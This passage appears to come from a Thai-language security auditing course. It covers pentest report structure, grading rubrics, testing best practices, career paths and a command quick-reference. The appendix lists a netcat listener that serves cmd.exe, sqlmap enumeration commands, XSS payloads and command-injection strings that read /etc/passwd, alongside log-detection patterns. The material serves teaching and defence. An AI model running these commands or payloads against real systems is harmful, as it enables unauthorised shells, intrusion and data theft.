- คำแนะนำหลัก (Top 3 priorities)
```

**2. Methodology (2-3 หน้า)**
```
- Framework ที่ใช้ (OWASP, NIST, PTES)
- เครื่องมือที่ใช้และเหตุผล
- ขั้นตอนการทดสอบ
- ข้อจำกัดของการทดสอบ
```

**3. Technical Findings (8-10 หน้า)**
```
สำหรับแต่ละช่องโหว่:
- ชื่อและประเภทช่องโหว่
- CVSS Score และ Risk Rating
- รายละเอียดทางเทคนิค
- Proof of Concept (Screenshots)
- ผลกระทบที่อาจเกิดขึ้น
- แนวทางแก้ไข (Remediation)
```

**4. Risk Assessment Matrix (1 หน้า)**
```
┌─────────────────┬──────────┬────────┬────────┬──────────┐
│ Vulnerability   │ Severity │ Impact │ Effort │ Priority │
├─────────────────┼──────────┼────────┼────────┼──────────┤
│ SQL Injection   │ Critical │ High   │ Low    │ P1       │
│ XSS             │ High     │ Medium │ Low    │ P2       │
│ Weak Passwords  │ Medium   │ Medium │ Medium │ P3       │
└─────────────────┴──────────┴────────┴────────┴──────────┘
```

**5. Recommendations (2-3 หน้า)**
```
- Immediate Actions (0-30 days)
- Short-term Improvements (1-6 months)
- Long-term Strategy (6-12 months)
- Security Awareness Training
- Policy and Procedure Updates
```

### เกณฑ์การประเมินผล:

| หัวข้อ | คะแนน | รายละเอียด |
|--------|--------|------------|
| **Technical Skills** | 30% | การใช้เครื่องมือ, ความถูกต้องของการทดสอบ |
| **Analysis Quality** | 25% | การวิเคราะห์ช่องโหว่, การประเมินความเสี่ยง |
| **Report Quality** | 25% | ความชัดเจน, ความสมบูรณ์, รูปแบบมืออาชีพ |
| **Presentation** | 20% | การนำเสนอ, การตอบคำถาม, การสื่อสาร |

**ตัวอย่าง Rubric:**

**Technical Skills (30 คะแนน)**
- การใช้เครื่องมือได้อย่างถูกต้อง (10 คะแนน)
- การค้นพบช่องโหว่ที่สำคัญ (10 คะแนน)  
- การทำ Manual testing (10 คะแนน)

**Analysis Quality (25 คะแนน)**
- การจัดลำดับความสำคัญของช่องโหว่ (10 คะแนน)
- การประเมิน Impact และ Risk (10 คะแนน)
- ความสมเหตุสมผลของการวิเคราะห์ (5 คะแนน)

---

# ส่วนที่ 8: Best Practices และแนวโน้มอนาคต

## 8.1 Security Testing Best Practices

### 1. Planning Phase
```yaml
Pre-Engagement Checklist:
  Legal:
    ✓ Authorization letter signed
    ✓ Scope clearly defined  
    ✓ Rules of engagement agreed
    ✓ Emergency contacts identified
    
  Technical:
    ✓ Testing environment prepared
    ✓ Backup and recovery plan
    ✓ Testing tools validated
    ✓ Baseline measurements taken
    
  Communication:
    ✓ Stakeholders informed
    ✓ Reporting timeline agreed
    ✓ Escalation procedures defined
```

### 2. Testing Execution
```python
# Security Testing Checklist
class SecurityTestChecklist:
    def __init__(self):
        self.tests = {
            'network': [
                'port_scanning',
                'service_enumeration', 
                'vulnerability_scanning',
                'configuration_review'
            ],
            'web_application': [
                'input_validation',
                'authentication_testing',
                'session_management',
                'authorization_testing',
                'data_validation'
            ],
            'infrastructure': [
                'os_hardening',
                'patch_management',
                'access_controls',
                'logging_monitoring'
            ]
        }
    
    def generate_test_plan(self, scope):
        """Generate customized test plan based on scope"""
        plan = []
        for category in scope:
            if category in self.tests:
                plan.extend(self.tests[category])
        return plan
```

### 3. Quality Assurance
- **Peer Review** - ให้เพื่อนร่วมงานตรวจสอบผลการทดสอบ
- **False Positive Validation** - ยืนยันช่องโหว่ที่พบ
- **Documentation Standards** - ใช้รูปแบบการรายงานที่มาตรฐาน
- **Continuous Learning** - ติดตามแนวโน้มและเทคนิคใหม่ๆ

---

## 8.2 การรับมือกับ Modern Threats

### 1. Cloud Security Testing
```bash
# AWS Security Assessment Tools
# S3 Bucket Enumeration
aws s3 ls --no-sign-request s3://target-bucket

# IAM Policy Analysis
aws iam get-account-summary
aws iam list-users
aws iam list-roles

# CloudTrail Log Analysis
aws logs describe-log-groups
aws logs filter-log-events --log-group-name CloudTrail
```

**Container Security:**
```bash
# Docker Security Scanning
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
  aquasec/trivy image nginx:latest

# Kubernetes Security Assessment
kubectl auth can-i --list
kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.securityContext}{"\n"}{end}'
```

### 2. IoT Security Assessment
```python
# IoT Device Discovery
import nmap

def scan_iot_devices(network):
    nm = nmap.PortScanner()
    
    # Common IoT ports
    iot_ports = "21,22,23,80,443,554,8080,8443,9000"
    
    result = nm.scan(network, iot_ports)
    
    iot_devices = []
    for host in nm.all_hosts():
        if nm[host].state() == 'up':
            for proto in nm[host].all_protocols():
                ports = nm[host][proto].keys()
                for port in ports:
                    service = nm[host][proto][port]
                    if 'camera' in service.get('product', '').lower() or \
                       'router' in service.get('product', '').lower():
                        iot_devices.append({
                            'ip': host,
                            'port': port,
                            'service': service.get('product', 'Unknown'),
                            'version': service.get('version', 'Unknown')
                        })
    
    return iot_devices

# Usage
devices = scan_iot_devices('192.168.1.0/24')
for device in devices:
    print(f"IoT Device found: {device['ip']}:{device['port']} - {device['service']}")
```

### 3. AI/ML Security Testing
```python
# Model Vulnerability Assessment
def test_ml_model_robustness(model, test_data):
    """Test ML model against adversarial attacks"""
    
    from adversarial_robustness_toolbox.attacks.evasion import FastGradientMethod
    from adversarial_robustness_toolbox.estimators.classification import KerasClassifier
    
    # Wrap the model
    classifier = KerasClassifier(model=model)
    
    # Create FGSM attack
    attack = FastGradientMethod(estimator=classifier, eps=0.1)
    
    # Generate adversarial examples
    adversarial_samples = attack.generate(x=test_data)
    
    # Test model predictions
    original_predictions = model.predict(test_data)
    adversarial_predictions = model.predict(adversarial_samples)
    
    # Calculate success rate
    success_rate = np.mean(
        np.argmax(original_predictions, axis=1) != 
        np.argmax(adversarial_predictions, axis=1)
    )
    
    return {
        'attack_success_rate': success_rate,
        'original_accuracy': np.mean(original_predictions),
        'adversarial_accuracy': np.mean(adversarial_predictions)
    }
```

---

## 8.3 อนาคตของ Security Testing

### 1. Automated Security Testing
```yaml
# CI/CD Pipeline Security Integration
stages:
  - build
  - test
  - security_scan
  - deploy

security_scan:
  stage: security_scan
  script:
    # Static Application Security Testing (SAST)
    - sonar-scanner -Dsonar.projectKey=myproject
    
    # Dynamic Application Security Testing (DAST)  
    - zap-baseline.py -t $APPLICATION_URL
    
    # Software Composition Analysis (SCA)
    - dependency-check.sh --project myproject --scan ./
    
    # Container Security Scanning
    - trivy image $DOCKER_IMAGE
    
    # Infrastructure as Code Security
    - checkov -f Dockerfile
    - tfsec .
    
  artifacts:
    reports:
      junit: security-report.xml
```

### 2. AI-Powered Security Testing
```python
# ML-Based Vulnerability Detection
class AISecurityScanner:
    def __init__(self):
        self.vulnerability_classifier = self.load_model('vuln_classifier.pkl')
        self.anomaly_detector = self.load_model('anomaly_detector.pkl')
    
    def intelligent_fuzzing(self, target_app):
        """AI-guided fuzzing for better coverage"""
        
        # Analyze application structure
        app_structure = self.analyze_app_structure(target_app)
        
        # Generate intelligent test cases
        test_cases = []
        for endpoint in app_structure['endpoints']:
            # Use ML to predict likely vulnerable parameters
            vulnerable_params = self.vulnerability_classifier.predict(
                endpoint['parameters']
            )
            
            # Generate targeted payloads
            for param in vulnerable_params:
                payloads = self.generate_smart_payloads(param)
                test_cases.extend(payloads)
        
        return test_cases
    
    def behavioral_anomaly_detection(self, network_traffic):
        """Detect anomalous behavior using ML"""
        
        # Feature extraction from network traffic
        features = self.extract_traffic_features(network_traffic)
        
        # Anomaly detection
        anomalies = self.anomaly_detector.predict(features)
        
        # Risk scoring
        risk_scores = self.calculate_risk_scores(anomalies)
        
        return {
            'anomalies_detected': len(anomalies),
            'high_risk_events': len([s for s in risk_scores if s > 0.8]),
            'recommendations': self.generate_recommendations(anomalies)
        }
```

### 3. Zero Trust Security Model
```python
# Zero Trust Assessment Framework
class ZeroTrustAssessment:
    def __init__(self):
        self.principles = [
            'verify_explicitly',
            'least_privilege_access',
            'assume_breach'
        ]
    
    def assess_identity_verification(self, auth_system):
        """Assess identity and access management"""
        
        checks = {
            'multi_factor_authentication': False,
            'conditional_access': False,
            'identity_governance': False,
            'privileged_access_management': False
        }
        
        # Test MFA implementation
        if self.test_mfa_bypass(auth_system):
            checks['multi_factor_authentication'] = False
        else:
            checks['multi_factor_authentication'] = True
            
        # Test conditional access policies
        checks['conditional_access'] = self.test_conditional_access(auth_system)
        
        return checks
    
    def assess_network_segmentation(self, network_topology):
        """Assess micro-segmentation implementation"""
        
        # Test lateral movement possibilities
        lateral_movement_paths = self.find_lateral_movement_paths(network_topology)
        
        # Test network policies
        policy_violations = self.test_network_policies(network_topology)
        
        return {
            'segmentation_score': self.calculate_segmentation_score(lateral_movement_paths),
            'policy_violations': policy_violations,
            'recommendations': self.generate_network_recommendations()
        }
```

---

## 8.4 การเตรียมตัวสำหรับอาชีพ Security Professional

### 1. Essential Skills Development
```
Technical Skills:
✓ Network Security (TCP/IP, Firewalls, VPN)
✓ Web Application Security (OWASP Top 10)
✓ Operating Systems (Linux, Windows)
✓ Programming/Scripting (Python, Bash, PowerShell)
✓ Cloud Security (AWS, Azure, GCP)
✓ Incident Response & Forensics

Soft Skills:
✓ Communication & Report Writing
✓ Risk Assessment & Management
✓ Project Management
✓ Continuous Learning Mindset
✓ Attention to Detail
```

### 2. Industry Certifications
```
Entry Level:
- CompTIA Security+
- CompTIA Network+
- EC-Council Computer Hacking Forensic Investigator Associate (CHFIA)

Intermediate:
- CISSP (Certified Information Systems Security Professional)
- CISA (Certified Information Systems Auditor)  
- CEH (Certified Ethical Hacker)
- GCIH (GIAC Certified Incident Handler)

Advanced:
- OSCP (Offensive Security Certified Professional)
- CISSP (Certified Information Systems Security Professional)
- CISM (Certified Information Security Manager)
- SABSA (Sherwood Applied Business Security Architecture)
```

### 3. Career Paths
```
Penetration Tester / Ethical Hacker:
- Focus: Manual testing, exploitation, red teaming
- Skills: Advanced penetration testing, social engineering
- Progression: Junior Pen Tester → Senior → Lead → Consulting

Security Auditor:
- Focus: Compliance, risk assessment, governance
- Skills: Audit frameworks, regulatory compliance
- Progression: Junior Auditor → Senior → Manager → CISO

Security Analyst (SOC):
- Focus: Monitoring, incident response, threat hunting
- Skills: SIEM tools, log analysis, threat intelligence
- Progression: L1 Analyst → L2 → L3 → SOC Manager

Application Security Engineer:
- Focus: Secure development, code review, DevSecOps
- Skills: SAST/DAST tools, secure coding practices
- Progression: AppSec Engineer → Senior → Architect → Principal
```

### 4. Hands-on Practice Platforms
```
Free Platforms:
- TryHackMe (https://tryhackme.com)
- HackTheBox (https://hackthebox.eu)  
- PicoCTF (https://picoctf.org)
- OverTheWire (https://overthewire.org)
- VulnHub (https://vulnhub.com)

Professional Labs:
- Cybrary
- PentesterLab
- PortSwigger Web Security Academy
- SANS NetWars
```

---

## 8.5 สรุปและข้อเสนอแนะ

### Key Takeaways จากการเรียนรู้ในสัปดาห์นี้:

1. **Security Auditing เป็นกระบวนการที่ต้องมีระบบ** - ไม่ใช่การทำงานแบบสุ่มสี่สุ่มห้า แต่ต้องมีแผนและวิธีการที่ชัดเจน

2. **Tools เป็นเพียงเครื่องมือ** - ความรู้และประสบการณ์ของผู้ใช้คือสิ่งที่สำคัญที่สุด

3. **การรายงานผลเป็นสิ่งสำคัญ** - ผลการทดสอบที่ดีที่สุดจะไร้ประโยชน์หากไม่สามารถสื่อสารให้ผู้บริหารเข้าใจได้

4. **Security เป็น Journey ไม่ใช่ Destination** - การรักษาความปลอดภัยต้องทำอย่างต่อเนื่อง

### แนวทางการเรียนรู้ต่อ:

```python
# Personal Development Roadmap
learning_path = {
    "month_1_3": [
        "Master basic networking concepts",
        "Learn Linux command line proficiently", 
        "Practice with DVWA and WebGoat",
        "Study OWASP Top 10 in depth"
    ],
    
    "month_4_6": [
        "Advanced penetration testing techniques",
        "Learn scripting (Python/Bash)",
        "Practice on HackTheBox/TryHackMe",
        "Study for Security+ certification"
    ],
    
    "month_7_12": [
        "Specialize in chosen area (Web/Network/Mobile)",
        "Build home lab environment",
        "Contribute to open source security tools",
        "Work toward advanced certifications (CEH/OSCP)"
    ]
}
```

### Resources สำหรับการเรียนรู้เพิ่มเติม:

**Books:**
- "The Web Application Hacker's Handbook" by Dafydd Stuttard
- "Metasploit: The Penetration Tester's Guide" by David Kennedy
- "Black Hat Python" by Justin Seitz
- "The Art of Software Security Assessment" by Mark Dowd

**Online Communities:**
- Reddit: r/netsec, r/AskNetSec
- Discord: Many security-focused servers
- Twitter: Follow security researchers and practitioners
- Local Security Meetups: OWASP chapters, 2600 meetings

**Podcasts:**
- Darknet Diaries
- Malicious Life  
- Security Now
- The Cyberwire Daily

---

# ภาคผนวก: Quick Reference

## A.1 Common Ports และ Services
```
Port 21   - FTP
Port 22   - SSH
Port 23   - Telnet
Port 25   - SMTP  
Port 53   - DNS
Port 80   - HTTP
Port 110  - POP3
Port 143  - IMAP
Port 443  - HTTPS
Port 993  - IMAPS
Port 995  - POP3S
Port 1433 - MSSQL
Port 3306 - MySQL
Port 3389 - RDP
Port 5432 - PostgreSQL
```

## A.2 Essential Command Reference

### Nmap Commands:
```bash
# Basic scans
nmap target.com
nmap -sS target.com              # SYN scan
nmap -sU target.com              # UDP scan
nmap -sV target.com              # Version detection
nmap -O target.com               # OS detection
nmap -A target.com               # Aggressive scan

# Port specifications  
nmap -p 80,443 target.com        # Specific ports
nmap -p 1-1000 target.com        # Port range
nmap -p- target.com              # All ports

# Output options
nmap -oN output.txt target.com   # Normal output
nmap -oX output.xml target.com   # XML output
nmap -oA output target.com       # All formats
```

### Netcat Commands:
```bash
# Port scanning
nc -zv target.com 80
nc -zv target.com 1-100

# Banner grabbing
nc target.com 80
echo "GET / HTTP/1.0\r\n\r\n" | nc target.com 80

# Listener
nc -l -p 4444                    # Linux
nc -l -p 4444 -e cmd.exe         # Windows

# File transfer
nc -l -p 4444 > received_file    # Receiver
nc target_ip 4444 < file_to_send # Sender
```

### Burp Suite Shortcuts:
```
Ctrl+Shift+D  - Dashboard
Ctrl+Shift+T  - Target
Ctrl+Shift+P  - Proxy  
Ctrl+Shift+I  - Intruder
Ctrl+Shift+R  - Repeater
Ctrl+R        - Send to Repeater
Ctrl+I        - Send to Intruder
```

## A.3 OWASP Top 10 2021 Quick Reference

1. **A01:2021 – Broken Access Control**
   - Violation of principle of least privilege
   - Bypassing access control checks
   - Accessing unauthorized functionality

2. **A02:2021 – Cryptographic Failures**
   - Weak encryption algorithms
   - Insufficient cryptographic strength
   - Improper certificate validation

3. **A03:2021 – Injection**
   - SQL, NoSQL, OS, LDAP injection
   - Hostile data sent to interpreter
   - Lack of input validation

4. **A04:2021 – Insecure Design**
   - Missing or ineffective control design
   - Threat modeling failures
   - Insecure design patterns

5. **A05:2021 – Security Misconfiguration**
   - Default configurations
   - Incomplete configurations
   - Open cloud storage

**Testing Commands:**
```bash
# SQL Injection testing
sqlmap -u "http://target/page.php?id=1" --dbs
sqlmap -u "http://target/page.php?id=1" --tables -D database_name

# XSS testing payloads
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
javascript:alert('XSS')

# Command injection
; ls -la
&& cat /etc/passwd
| whoami
```

## A.4 Log Analysis Patterns

### Common Attack Patterns:
```bash
# SQL Injection attempts
grep -i "union.*select" access.log
grep -i "1.*=.*1" access.log

# XSS attempts  
grep -i "script" access.log
grep -i "javascript:" access.log

# Directory traversal
grep -i "\.\." access.log
grep -i "etc/passwd" access.log

# Brute force attacks
awk '$9 == "401" {print $1}' access.log | sort | uniq -c | sort -nr

# Large file downloads
awk '$10 > 10000000 {print $1, $7, $10}' access.log
```

### Windows Event Log Analysis:
```powershell
# Failed logon attempts (Event ID 4625)
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625} | 
Select-Object TimeCreated, Id, LevelDisplayName, Message

# Successful logons (Event ID 4624)
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} | 
Where-Object {$_.Message -like "*Logon Type: 10*"}

# Account lockouts (Event ID 4740)
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4740}
```

---

## Final Notes

การเรียนรู้ Security Auditing และ Vulnerability Assessment เป็นการเริ่มต้นของการเป็น Security Professional ที่มีคุณภาพ ความสำคัญไม่ได้อยู่ที่เครื่องมือหรือเทคนิค แต่อยู่ที่ **mindset** และ **methodology** ที่ถูกต้อง

**Remember:**
- 🔒 **Security is everyone's responsibility**
- 🎯 **Be systematic and thorough**  
- 📚 **Never stop learning**
- 🤝 **Share knowledge with the community**
- ⚖️ **Always follow ethical guidelines**

**"The best defense is a good offense, but only when conducted ethically and legally."**

---

**คำถามสำหรับการทบทวน:**
1. อธิบายความแตกต่างระหว่าง Vulnerability Assessment และ Penetration Testing
2. เครื่องมือใดบ้างที่เหมาะสมสำหรับการทดสอบ Web Application Security?
3. จงยกตัวอย่างการใช้ Log Analysis ในการตรวจจับการโจมตี
4. หลักการสำคัญของ Zero Trust Security Model คืออะไร?
5. แนวทางใดที่ควรใช้ในการรายงานผลการ Security Assessment ให้กับผู้บริหาร?

**แหล่งข้อมูลเพิ่มเติม:**
- OWASP.org - มาตรฐานความปลอดภัยสำหรับเว็บแอปพลิเคชัน
- NIST.gov - กรอบงานและมาตรฐานความปลอดภัย
- SANS.org - การฝึกอบรมและงานวิจัยด้านความปลอดภัย
- CVE.org - ฐานข้อมูลช่องโหว่ความปลอดภัย